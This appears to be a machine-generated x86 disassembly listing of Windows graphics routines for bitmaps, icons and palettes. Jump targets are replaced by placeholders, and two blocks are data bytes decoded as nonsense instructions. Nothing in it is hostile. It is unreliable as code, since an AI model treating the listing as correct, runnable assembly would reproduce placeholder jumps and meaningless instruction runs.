mov [ fs : edx ] esp
mov edi [ ebp - 0x8 ]
mov eax edi
add eax 0x28
mov edx esi
add edx edx
add edx edx
add eax edx
mov [ ebp - 0x1c ] eax
push 0x0
mov eax [ ebp - 0x8 ]
push edi
mov eax [ ebp - 0x1c ]
push eax
push 0x4
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBitmap
call sub_44e2f0
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_44ebb3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0x14 ]
call sub_44e300
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ebba
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
call sub_44e1f4
sub_44ebba
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x8 ]
movzx edx bx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_44e480
mov edx [ ebp - 0x8 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x8 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x8 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x8 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x8 ]
push ebx
mov eax [ ebp - 0x1c ]
push eax
push 0x4
mov eax [ ebp - 0x8 ]
push ebx
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBitmap
call sub_44e2f0
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_44ec6d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x14 ]
call sub_44e300
mov edx [ ebp - 0x10 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ec74
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
sub_44eca0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] eax
movzx ecx [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
movzx ebx [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x8 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0xc ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0xc ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0xc ]
jle r-xdata
sub_44ed30
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_4041ec
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_44f031
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push sub_44ee19
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_44e1f4
push 0x0
call GetDC
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ee20
mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_44ee20
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
test eax eax
jne r-xdata
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax 0x7fffffff
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_4041ec
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_44f011
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_44eae0
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectW
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectW
mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_4041ec
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push sub_44efee
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
movzx eax [ ebp - 0x46 ]
push eax
movzx eax [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov ebx 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44eff5
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_404220
retn
call sub_44e248
mov esi eax
cmp esi [ ebp - 0x1c ]
jg r-xdata
mov eax 0x7fffffff
inc ebx
dec edi
jne r-xdata
cmp esi [ ebp - 0x20 ]
jl r-xdata
mov eax ebx
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
test eax eax
jne r-xdata
push ebp
mov eax ebx
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_44eca0
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] esi
sub_44f044
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectW
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_44e1dc
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_404c14
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_44e480
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
movzx eax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_44f128
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_44f044
movzx eax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
add eax eax
add eax eax
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
add eax eax
add eax eax
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_44f198
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_44f044
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44f235
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f23c
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_44f270
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_404c14
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_404c14
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_44f264
xor edx edx
push ebp
push sub_44f460
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_44f128
push 0xffffffff
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_44f128
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_44f439
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_4041ec
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_4041ec
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_4041ec
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_4041ec
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_44f198
mov eax [ ebp - 0x24 ]
push eax
push 0xffffffff
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_44f198
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov esi [ ebp - 0x20 ]
mov eax esi
movzx edx [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
movzx edx [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
movzx edx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f440
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_404220
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_404220
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_404220
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_404220
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_44f440
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f467
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_44f470
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4055c0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax esi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_44f4c0
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_44f518
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x48 ]
push eax
push ebp
call sub_44f4c0
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44f580
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
mov edx [ ebx ]
mov eax edx
mov ecx [ esi ]
mov edx ecx
cmp edx eax
sete al
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
movzx eax [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44f6ad
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44f690
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_410f30
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f697
mov eax [ ebp - 0xc ]
call sub_4055f0
retn
mov al 0x1
sub_44f6c0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4056ac
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
pop esi
pop ebx
retn
sub_44f700
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_43463c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44f748
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f74f
mov eax [ ebp - 0x4 ]
call sub_4055f0
retn
sub_44f754
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
movzx ebx [ ebp + 0x14 ]
push ebx
movzx ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_44f78c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xff00
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_43463c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44f7d7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x60 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f7de
mov eax [ ebp - 0x4 ]
call sub_4055f0
retn
sub_44f7fc
push ebx
push esi
mov esi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
pop esi
pop ebx
retn
sub_44f845
stc
inc esp
add [ ecx + edi * 8 ] ah
inc esp
add [ ecx + edi * 8 + 0x44 ] ch
add [ eax ] al
add [ eax ] al
add [ eax + 0x6c0044f9 ] al
add [ eax ] al
add [ esi + eax * 4 + 0x56ac0044 ] cl
inc eax
add [ esi + edx * 2 + 0x58b80040 ] dh
inc eax
add [ eax - 0x2fffbfa8 ] dh
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ ebx + edi * 8 + 0x139c0044 ] dl
inc ebx
add [ ebx + edx + 0x12cc0043 ] ah
inc ebx
add [ edx + ebx * 8 - 0x2103ffbc ] dh
inc esp
add [ eax - 0x22 ] al
inc esp
add [ eax + 0x680044de ] cl
fiadd [ eax + eax - 0x4c ]
fiadd [ eax + eax - 0xc ]
into
inc esp
add [ eax ] cl
iretd
sub_44f8b6
inc esp
add [ eax ] al
loopne r-xdata
add al bl
fld [ eax + eax + 0x20 ]
fiadd [ eax + eax + 0x28 ]
fiadd [ eax + eax + 0x78 ]
fiadd [ eax + eax + 0x6c ]
fld [ eax + eax - 0x20 ]
fiadd [ eax + eax - 0x44 ]
fadd [ eax + eax - 0x38 ]
fild [ eax + eax + 0x64 ]
cld
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
js r-xdata
add [ ecx + edx * 8 - 0x2e23ffbc ] al
inc esp
add [ eax - 0x7fffbb2c ] ah
aad 0x44
add [ esi + edx * 8 ] ch
inc esp
add al ah
salc
inc esp
add [ edi + edx * 8 ] dl
inc esp
add [ edi + edx * 8 + 0x44 ] bl
add [ eax - 0x17ffbb29 ] bl
xlat
inc esp
add [ eax + ebx * 8 ] ch
inc esp
add [ eax + ebx * 8 + 0x44 ] ah
add [ eax - 0x17ffbb28 ] dl
fadd [ eax + eax + 0x24 ]
fld [ eax + eax + 0x60 ]
fld [ eax + eax - 0x64 ]
fld [ eax + eax - 0x28 ]
inc esp
add [ eax ] bl
add [ eax ] al
pop es
inc esi
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x270
hlt
sub_44fa18
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_431088
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44fac0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fac7
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_44fa8e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_44fbc0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_44d038
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4305a0
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_44cfdc
test al al
je r-xdata
sub_44facc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_431088
mov esi eax
xor ecx ecx
push ebp
push sub_44fb48
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
mov edx ebx
mov eax esi
call sub_4305a0
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_44fbc0
sub_44fb58
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_44d060
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_44fb94
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
mov eax esi
call sub_44fbc0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44d124
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_44fbc0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44cf34
xor edx edx
push ebp
push sub_44fc56
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x38 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44dfac
push ebx
call DeleteDC
mov cl 0x1
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4310a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_44d038
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
call SelectPalette
sub_44fc64
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
